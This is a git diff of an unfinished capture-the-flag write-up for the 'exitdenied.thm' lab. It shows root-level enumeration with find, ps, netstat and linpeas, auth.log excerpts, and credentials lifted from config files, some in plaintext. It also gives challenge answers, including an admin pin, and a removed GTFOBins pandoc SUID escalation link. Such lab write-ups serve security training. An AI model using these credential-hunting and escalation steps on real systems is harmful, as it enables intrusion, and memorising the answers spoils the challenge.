-/lib/systemd/system/initrd-switch-root.target
-/lib/systemd/system/systemd-volatile-root.service
-/lib/systemd/system/initrd-root-fs.target
-/lib/systemd/system/initrd-root-device.target
-/lib/systemd/system/systemd-fsck-root.service
-/lib/systemd/system/plymouth-switch-root.service
-/lib/systemd/systemd-volatile-root
-/lib/recovery-mode/options/root
-/lib/x86_64-linux-gnu/security/pam_rootok.so
+...
 /etc/update-motd.d/97-overlayroot
 /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
 /etc/overlayroot.conf
@@ -1296,23 +1229,24 @@ root@...:/# find / -type f -name "*root*" 2>/dev/null
 /usr/lib/klibc/bin/pivot_root
 /usr/lib/klibc/bin/chroot
 ...
-/var/lib/dpkg/alternatives/fakeroot
-/var/spool/cron/crontabs/root
-/var/log/vmware-vmsvc-root.2.log
-/var/log/vmware-vmtoolsd-root.log
-/var/log/vmware-vmsvc-root.log
-/var/log/vmware-vmsvc-root.1.log
-/var/log/vmware-vmsvc-root.3.log
-/sys/kernel/security/apparmor/features/namespaces/pivot_root
-/bin/btrfs-find-root
-/proc/sys/kernel/keys/root_maxbytes
-/proc/sys/kernel/keys/root_maxkeys
-/proc/sys/kernel/real-root-dev
-/sbin/pivot_root
-/sbin/switch_root
-/run/initramfs/overlayroot.log
-/run/initramfs/fsck-root
 ```
+
+```bash
+root@...:/etc# ps aux | grep root
+...
+root         635  0.0  0.3 236064  7852 ?        Ssl  20:13   0:00 /usr/lib/accountsservice/accounts-daemon
+root         636  0.0  1.1 793300 23144 ?        Ssl  20:13   0:00 /usr/bin/amazon-ssm-agent
+root         643  0.0  0.1  81832  3564 ?        Ssl  20:13   0:00 /usr/sbin/irqbalance --foreground
+root         645  0.0  0.9  29924 18760 ?        Ss   20:13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         662  0.0  0.1   7072  3172 ?        Ss   20:13   0:00 /usr/sbin/cron -f
+root         663  0.0  0.3 232988  7128 ?        Ssl  20:13   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root         667  0.0  0.4  19892  7920 ?        Ss   20:13   0:00 /lib/systemd/systemd-logind
+root         671  0.0  0.6 395764 12216 ?        Ssl  20:13   0:00 /usr/lib/udisks2/udisksd
+...
+```
+
+<br>
+<p align="center">matrix V99.2</p>
 
 ```bash
 root@...:/## getent hosts
@@ -1322,7 +1256,7 @@ root@...:/## getent hosts
 ```
 
 <br>
-<p>3306</p>
+<p align="center">3306</p>
 
 ```bash
 root@...:~# netstat -tunlp | grep LISTEN
@@ -1336,7 +1270,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 <br>
 <br>
 <br>
-<p>linpeas.sh</p>
+<p align="center">Execute <code>linpeas.sh</code>.<br>/etc</p>
 
 <img width="1202" height="835" alt="image" src="https://github.com/user-attachments/assets/1d98e360-0aa7-43b5-b848-8c47eae310ad" />
 
@@ -1345,10 +1279,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 <br>
     
 ```bash
-[+] Searching installed mail applications
-
-[+] Mails (limit 50)
-
+...
 [+] Backup files?
 ...
 -rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
@@ -1359,20 +1290,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
  -> Extracting tables from /var/lib/mlocate/mlocate.db (limit 20)
  -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
-
-
-[+] Web files?(output limit)
-/var/www/:
-total 12K
-drwxr-xr-x  3 root root 4.0K Dec 23  2020 .
-drwxr-xr-x 13 root root 4.0K Feb 25  2021 ..
-drwxr-xr-x 12 root root 4.0K Mar  9  2021 html
-
-/var/www/html:
-total 2.7M
-drwxr-xr-x 12 root     root     4.0K Mar  9  2021 .
-drwxr-xr-x  3 root     root     4.0K Dec 23  2020 ..
-
+...
 [+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
 -rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
@@ -1380,158 +1298,25 @@ drwxr-xr-x  3 root     root     4.0K Dec 23  2020 ..
 -rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
 lrwxrwxrwx 1 root root 46 Apr 27 13:41 /etc/systemd/user/sockets.target.wants/pk-debconf-helper.socket -> /usr/lib/systemd/user/pk-debconf-helper.socket
 ...
--rw-r--r-- 1 root root 161 Jan  2  2024 /root/.profile
--rw-r--r-- 1 root root 3106 Jan  2  2024 /usr/share/base-files/dot.bashrc
--rw-r--r-- 1 root root 2978 Feb 17  2020 /usr/share/byobu/profiles/bashrc
--rw-r--r-- 1 root root 2778 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
--rw-r--r-- 1 root root 802 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-
 [+] Finding passwords inside logs (limit 70)
 ...
 /var/log/auth.log.1:Dec 23 17:45:48 matrixV99 sshd[1183]: Accepted password for architect from 192.168.200.131 port 33102 ssh2
-/var/log/auth.log.1:Dec 23 17:47:15 matrixV99 sudo: architect : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
-/var/log/auth.log.1:Dec 23 17:47:19 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/apt update
-/var/log/auth.log.1:Dec 23 17:47:35 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/apt-get install apache2
-/var/log/auth.log.1:Dec 23 17:49:33 matrixV99 chage[2924]: changed password expiry for mysql
-/var/log/auth.log.1:Dec 23 17:53:31 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/apt update
-/var/log/auth.log.1:Dec 23 17:59:38 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/mysql -u root -p
-/var/log/auth.log.1:Dec 23 18:04:07 matrixV99 sshd[18720]: Accepted password for architect from 192.168.200.131 port 33126 ssh2
-/var/log/auth.log.1:Dec 23 18:04:42 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/mv Upload /var/www/mybb
-/var/log/auth.log.1:Dec 23 18:04:53 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/mybb
-/var/log/auth.log.1:Dec 23 18:06:20 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/sbin/a2ensite mybb.conf
-/var/log/auth.log.1:Dec 23 18:06:32 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/sbin/a2enmod rewrite
-/var/log/auth.log.1:Dec 23 18:06:40 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/sbin/a2enmod rewrite
-/var/log/auth.log.1:Dec 24 13:19:47 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
-/var/log/auth.log.1:Dec 24 13:20:31 matrixV99 sshd[2918]: Accepted password for architect from 192.168.200.131 port 41888 ssh2
+...
 /var/log/auth.log.1:Dec 30 18:16:52 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
 /var/log/auth.log.1:Dec 30 18:17:06 matrixV99 passwd[3672]: pam_unix(passwd:chauthtok): password changed for root
 /var/log/auth.log.1:Dec 30 18:21:03 matrixV99 sshd[3694]: Accepted password for architect from 192.168.200.131 port 52974 ssh2
 /var/log/auth.log.1:Dec 30 18:21:07 matrixV99 sudo: architect : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
 /var/log/auth.log.1:Dec 30 18:23:35 matrixV99 sshd[3830]: Accepted password for root from 192.168.200.131 port 52976 ssh2
-/var/log/auth.log.1:Dec 30 18:25:15 matrixV99 sshd[3936]: Accepted password for root from 192.168.200.131 port 41141 ssh2
-/var/log/auth.log.1:Dec 30 18:25:58 matrixV99 sshd[4016]: Accepted password for root from 192.168.200.131 port 43997 ssh2
-/var/log/auth.log.1:Jan 13 13:03:21 matrixV99 sshd[2930]: Accepted password for root from 192.168.200.131 port 57759 ssh2
-/var/log/auth.log.1:Jan 13 14:54:22 matrixV99 sshd[3437]: Accepted password for root from 192.168.200.131 port 60623 ssh2
-/var/log/auth.log.1:Jan 13 14:54:22 matrixV99 sshd[3439]: Accepted password for root from 192.168.200.131 port 46937 ssh2
-/var/log/auth.log.1:Jan 14 21:27:57 matrixV99 sshd[13474]: Accepted password for root from 192.168.200.131 port 51389 ssh2
-/var/log/auth.log.1:Jan 14 21:30:18 matrixV99 sshd[13639]: Accepted password for root from 192.168.200.131 port 45985 ssh2
-/var/log/auth.log.1:Jan 14 21:39:12 matrixV99 sshd[13791]: Accepted password for root from 192.168.200.131 port 36305 ssh2
-/var/log/auth.log.1:Jan 14 21:40:09 matrixV99 sshd[13861]: Accepted password for root from 192.168.200.131 port 45905 ssh2
-/var/log/auth.log.1:Jan 14 21:42:09 matrixV99 sshd[13931]: Accepted password for root from 192.168.200.131 port 47975 ssh2
-/var/log/auth.log.1:Jan 18 19:12:21 matrixV99 sshd[1796]: Accepted password for root from 192.168.200.131 port 41679 ssh2
-/var/log/auth.log.1:Jan 18 19:16:05 matrixV99 sshd[1942]: Accepted password for root from 192.168.200.131 port 45781 ssh2
-/var/log/auth.log.1:Jan 18 19:16:05 matrixV99 sshd[1943]: Accepted password for root from 192.168.200.131 port 45689 ssh2
-/var/log/auth.log.1:Jan 21 12:58:18 matrixV99 sshd[2372]: Accepted password for root from 192.168.200.131 port 60838 ssh2
+...
 /var/log/auth.log.1:Jan 21 13:01:10 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/update-rc.d -f ntpdate remove
 /var/log/auth.log.1:Jan 21 16:52:01 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
 /var/log/auth.log.1:Jan 21 20:03:23 matrixV99 sshd[1912]: Accepted password for root from 192.168.200.131 port 45266 ssh2
 /var/log/auth.log.1:Jan 21 20:04:27 matrixV99 chage[2182]: changed password expiry for ntp
 /var/log/auth.log.1:Jan 21 20:04:27 matrixV99 usermod[2177]: change user 'ntp' password
-/var/log/auth.log.1:Jan 22 10:18:24 matrixV99 sshd[2160]: Accepted password for root from 192.168.200.131 port 58240 ssh2
-/var/log/auth.log.1:Jan 22 10:18:48 matrixV99 sshd[2304]: Accepted password for root from 192.168.200.131 port 58242 ssh2
-/var/log/auth.log.1:Jan 22 10:19:10 matrixV99 sshd[2385]: Accepted password for root from 192.168.200.131 port 58244 ssh2
-/var/log/auth.log.1:Jan 22 10:19:47 matrixV99 sshd[2466]: Accepted password for root from 192.168.200.131 port 58246 ssh2
-/var/log/auth.log.1:Jan 22 10:21:31 matrixV99 sshd[2583]: Accepted password for root from 192.168.200.131 port 58248 ssh2
-/var/log/auth.log.1:Jan 27 16:41:33 matrixV99 sshd[1964]: Accepted password for root from 192.168.200.131 port 37990 ssh2
-/var/log/auth.log.1:Jan 27 16:46:59 matrixV99 sshd[2164]: Accepted password for root from 192.168.200.131 port 37992 ssh2
-/var/log/auth.log.1:Jan 27 16:48:30 matrixV99 sudo:     root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/service ntp restart
-/var/log/auth.log.1:Jan 27 16:48:35 matrixV99 sshd[1544]: Accepted password for root from 192.168.200.131 port 37996 ssh2
-/var/log/auth.log.1:Jan 27 16:54:32 matrixV99 sshd[1732]: Accepted password for root from 192.168.200.131 port 37998 ssh2
-/var/log/auth.log.1:Jan 27 16:58:08 matrixV99 chpasswd[1073]: pam_unix(chpasswd:chauthtok): password changed for architect
-/var/log/auth.log.1:Jan 27 16:58:08 matrixV99 sudo:     root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/service ntp restart
-/var/log/auth.log.1:Jan 27 16:58:28 matrixV99 sshd[1526]: Accepted password for architect from 192.168.200.131 port 38000 ssh2
-/var/log/auth.log.1:Jan 27 16:59:00 matrixV99 chpasswd[1733]: pam_unix(chpasswd:chauthtok): password changed for architect
-/var/log/auth.log.1:Jan 27 16:59:09 matrixV99 sshd[1742]: Accepted password for architect from 192.168.200.131 port 38002 ssh2
-/var/log/auth.log.1:Jan 27 17:00:00 matrixV99 chpasswd[1891]: pam_unix(chpasswd:chauthtok): password changed for architect
-/var/log/auth.log.1:Jan 27 17:01:00 matrixV99 chpasswd[1954]: pam_unix(chpasswd:chauthtok): password changed for architect
+...
 /var/log/auth.log.1:Jan 27 17:02:00 matrixV99 chpasswd[2017]: pam_unix(chpasswd:chauthtok): password changed for architect
 ...
-[+] Finding *password* or *credential* files in home (limit 70)
-
-[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
-/etc/amazon/ssm/README.md:docker run -it --rm --name ssm-agent-build-container -v `pwd`:/amazon-ssm-agent ssm-agent-build-image make build-release
-/etc/cloud/cloud.cfg:    lock_passwd: True
-/etc/cloud/cloud.cfg:    sudo: ["ALL=(ALL) NOPASSWD:ALL"]
-/etc/init.d/ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
-/etc/mysql/debian.cnf:password = 
-/etc/nsswitch.conf:passwd:         compat systemd
-/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
-/etc/rc2.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
-/etc/rc3.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
-/etc/rc4.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
-/etc/rc5.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
-/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
-/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
-/etc/security/namespace.init:        passwd=$(getent passwd "$user")
-/etc/ssl/openssl.cnf:challengePassword		= A challenge password
-/etc/ssl/openssl.cnf:challengePassword_max		= 20
-/etc/ssl/openssl.cnf:challengePassword_min		= 4
-/etc/sudoers.d/90-cloud-init-users:ubuntu ALL=(ALL) NOPASSWD:ALL
-/tmp/linpeas.sh.1:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
-/tmp/linpeas.sh.1:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
-/tmp/linpeas.sh.1:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
-/tmp/linpeas.sh.1:PASSWORD=""
-/tmp/linpeas.sh.1:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
-/tmp/linpeas.sh.1:  PASSWORDTRY=$2
-/tmp/linpeas.sh.1:    P)  PASSWORD=$OPTARG;;
-/tmp/linpeas.sh.1:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
-/tmp/linpeas.sh.1:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
-/var/www/html/admin/inc/class_form.php:		$input = "<input type=\"password\" name=\"".$name."\" value=\"".htmlspecialchars_uni($value)."\"";
-/var/www/html/admin/inc/class_form.php:	function generate_password_box($name, $value="", $options=array())
-/var/www/html/admin/inc/class_page.php:			<div class="field"><input type="password" name="password" id="password" class="text_input" /></div>
-/var/www/html/admin/index.php:		'password' => $mybb->input['password']
-/var/www/html/admin/modules/forum/management.php:		$forum_data['password'] = "";
-/var/www/html/admin/modules/forum/management.php:				"password" => $db->escape_string($mybb->input['password']),
-/var/www/html/admin/modules/user/users.php:			$updated_user['password'] = $mybb->input['new_password'];
-/var/www/html/admin/modules/user/users.php:			$updated_user['password2'] = $mybb->input['confirm_new_password'];
-/var/www/html/admin/modules/user/users.php:			"password" => $mybb->input['password'],
-/var/www/html/admin/modules/user/users.php:			"password2" => $mybb->input['confirm_password'],
-/var/www/html/archive/global.php:		$query = $db->simple_select("forums", "*", "fid='{$id}' AND active!=0 AND password=''");
-/var/www/html/archive/index.php:		$query = $db->simple_select("forums", "*", "active!=0 AND password=''", array('order_by' =>'pid, disporder'));
-/var/www/html/archive/index.php:			if(!$forum['fid'] || $forum['password'] !== '')
-/var/www/html/archive/index.php:		if(!$forum['fid'] || $forum['password'] !== '')
-/var/www/html/cache/themes/theme4/usercp.css:.usercp_nav_password:before{content:"\f084";}
-/var/www/html/forumdisplay.php:	if($foruminfo['password'] != '')
-/var/www/html/inc/config.php:$config['database']['password'] = 'prefixnulledcerv9';
-/var/www/html/inc/datahandlers/login.php:				$db->update_query("users", $password_fields, "uid = '{$this->login_data['uid']}'");
-/var/www/html/inc/datahandlers/login.php:				$password_fields = create_password($this->login_data['password']);
-/var/www/html/inc/datahandlers/login.php:	function verify_password($strict = true)
-/var/www/html/inc/datahandlers/user.php:		$password_fields = create_password($user['password'], false, $user);
-/var/www/html/inc/datahandlers/user.php:			$this->user_update_data['password'] = $user['password'];
-/var/www/html/inc/datahandlers/user.php:		if($mybb->settings['requirecomplexpasswords'] == 1)
-/var/www/html/inc/datahandlers/user.php:			if($user['email'] === $user['password'] || $user['username'] === $user['password']
-/var/www/html/inc/datahandlers/user.php:		if(isset($user['password2']) && $user['password'] !== $user['password2'])
-/var/www/html/inc/datahandlers/user.php:			"password" => $user['password'],
-/var/www/html/inc/db_pdo.php:	function __construct($dsn, $username="", $password="", $driver_options=array())
-/var/www/html/inc/db_pgsql.php:					$this->connect_string .= " password={$single_connection['password']}";
-/var/www/html/inc/functions_archive.php:function check_forum_password_archive($fid, $pid=0)
-/var/www/html/inc/functions_online.php:			elseif($parameters['action'] == "password" || $parameters['action'] == "do_password")
-/var/www/html/inc/functions.php:function check_forum_password($fid, $pid=0, $return=false)
-/var/www/html/inc/functions.php:function forum_password_validated($forum, $ignore_empty=false, $check_parents=false)
-/var/www/html/inc/functions.php:	if($forum_cache[$fid]['password'] !== '')
-/var/www/html/inc/functions.php:			if($forum_cache[$parent_id]['password'] !== "")
-/var/www/html/inc/functions.php:	return ($ignore_empty && $forum['password'] === '') || (
-/var/www/html/inc/functions_search.php:function get_password_protected_forums($fids=array())
-/var/www/html/inc/functions_user.php:	$db->update_query("users", $newpassword, "uid='$uid'");
-/var/www/html/inc/functions_user.php:		$db->update_query("users", $password_fields, "uid='".$user['uid']."'");
-/var/www/html/inc/functions_user.php:	$newpassword = array();
-/var/www/html/inc/functions_user.php:	$newpassword['loginkey'] = $loginkey;
-/var/www/html/inc/functions_user.php:	$newpassword['password'] = $saltedpw;
-/var/www/html/inc/functions_user.php:		$newpassword['salt'] = $salt;
-/var/www/html/inc/functions_user.php:		$password_fields = create_password($password, $user['salt'], $user);
-
-[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
-/root/SSH-TOTP-timeSimulator.py:    if(t_sshpass != currentpass):   
-/root/SSH-TOTP-timeSimulator.py:    sshpass = (sha256(repr(nOTP).encode('utf-8')).hexdigest())
-/root/SSH-TOTP-timeSimulator.py:    t_sshpass = sshpass[22:44]
-/var/www/html/inc/3rdparty/2fa/GoogleAuthenticator.php:        $secretkey = $this->_base32Decode($secret);
-/var/www/html/inc/languages/english/admin/user_users.lang.php:$l['recieve_admin_emails'] = "Receive emails from administrators";
-/var/www/html/install/resources/language.lang.php:$l['database_host'] = "Database Server Hostname:";
-/var/www/html/install/resources/language.lang.php:$l['database_name'] = "Database Name:";
-/var/www/html/install/resources/language.lang.php:$l['database_user'] = "Database Username:";
 ```
-
-
 
 <br>
 <p>/etc/</p>
@@ -1539,7 +1324,7 @@ lrwxrwxrwx 1 root root 46 Apr 27 13:41 /etc/systemd/user/sockets.target.wants/pk
 ```bash
 root@...:/etc# cat bigpaul.txt
 web login:
-bigpaul = ilovemywifeandgirlfriend022366
+bigpaul = ⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾
 ACP Pin = ------⊕-----+------
 ```
 
@@ -1557,8 +1342,14 @@ Type "help", "copyright", "credits" or "license" for more information.
 <br>
 <br>
 <br>
+<p>1.13. What is the admin's ACP pin?<br>
+<code>718008</code></p>
+<br>
 
-<p align="center">exitdenied.thm/admin/</p>
+<br>
+<br>
+<br>
+<p align="center">Navigate to exitdenied.thm/admin/ and login as <code>bigpaul</code>.</p>
 
 <img width="1130" height="488" alt="image" src="https://github.com/user-attachments/assets/46503ebd-2b81-4624-85b1-9cd7c34d27bb" />
 
@@ -1571,47 +1362,11 @@ Type "help", "copyright", "credits" or "license" for more information.
 <br>
 <br>
 <br>
-
-<br>
 <p>1.14. What is the web flag?<br>
 <code>fL4g{**********}</code></p>
 <br>
 <br>
 
-
-
-
-
-
-```bash
-root@...:/etc# ps aux | grep root
-...
-root         635  0.0  0.3 236064  7852 ?        Ssl  20:13   0:00 /usr/lib/accountsservice/accounts-daemon
-root         636  0.0  1.1 793300 23144 ?        Ssl  20:13   0:00 /usr/bin/amazon-ssm-agent
-root         643  0.0  0.1  81832  3564 ?        Ssl  20:13   0:00 /usr/sbin/irqbalance --foreground
-root         645  0.0  0.9  29924 18760 ?        Ss   20:13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
-root         662  0.0  0.1   7072  3172 ?        Ss   20:13   0:00 /usr/sbin/cron -f
-root         663  0.0  0.3 232988  7128 ?        Ssl  20:13   0:00 /usr/lib/policykit-1/polkitd --no-debug
-root         667  0.0  0.4  19892  7920 ?        Ss   20:13   0:00 /lib/systemd/systemd-logind
-root         671  0.0  0.6 395764 12216 ?        Ssl  20:13   0:00 /usr/lib/udisks2/udisksd
-root         675  0.0  0.1   8628  3348 ?        S    20:13   0:00 /usr/sbin/CRON -f
-root         699  0.0  0.0   2616   532 ?        Ss   20:13   0:00 /bin/sh -c sudo python3 /root/SSH-TOTP-timeSimulator.py
-root         701  0.0  0.2   9552  4744 ?        S    20:13   0:00 sudo python3 /root/SSH-TOTP-timeSimulator.py
-root         729  0.0  0.1   5828  2436 ttyS0    Ss+  20:13   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
-root         734  0.0  0.1   6056  2016 tty1     Ss+  20:13   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
-root         746  0.1  0.6  21516 12156 ?        S    20:13   0:04 python3 /root/SSH-TOTP-timeSimulator.py
-root         783  0.0  1.0 108412 20964 ?        Ssl  20:13   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
-root         784  0.0  0.3  14348  7444 ?        Ss   20:13   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
-root         785  0.0  0.5 241404 11312 ?        Ssl  20:13   0:00 /usr/sbin/ModemManager
-root         885  0.0  1.8 242396 36324 ?        Ss   20:13   0:00 /usr/sbin/apache2 -k start
-root         971  0.0  1.8 808384 36296 ?        Sl   20:13   0:00 /usr/bin/ssm-agent-worker
-root        1112  1.7  5.4 2281064 108140 ?      Ssl  20:13   0:54 /etc/badr/badr --config /etc/badr/rules.yaml --config /etc/badr/room.config.yaml > /var/log/badr.log 2>&1
-root        1692  0.0  0.0      0     0 ?        I    20:18   0:00 [kworker/0:0-events]
-```
-
-
-
-<br>
 <img width="1140" height="199" alt="image" src="https://github.com/user-attachments/assets/cc69f2ef-ca8b-40c5-bba5-cbe8234eeedf" />
 
 <br>
@@ -1624,32 +1379,6 @@ root        1692  0.0  0.0      0     0 ?        I    20:18   0:00 [kworker/0:0-
 <br>
 <br>
 
-<p>GTFObins Pandoc:https://gtfobins.github.io/gtfobins/pandoc/#suid</p>
-
-<img width="1102" height="310" alt="image" src="https://github.com/user-attachments/assets/a1455292-5cc3-43cb-b3e6-6ecd466fe85d" />
-
-<br>
-<br>
-<br>
-
-
-
-
-
-<br>
-<p>1.12. What is the root flag?<br>
-<code>_______</code></p>
-<br>
-
-
-<br>
-<p>1.13. What is the admin´s ACP pin?<br>
-<code>_______</code></p>
-<br>
-
-<br>
-<br>
-<br>
 <h1 align="center">In Progress</h1>
 <p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/61404b71-0db5-4d3d-9514-2c8720e5c5b1"><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/9de58130-2da7-44f3-8633-8e129de943a5"></p>
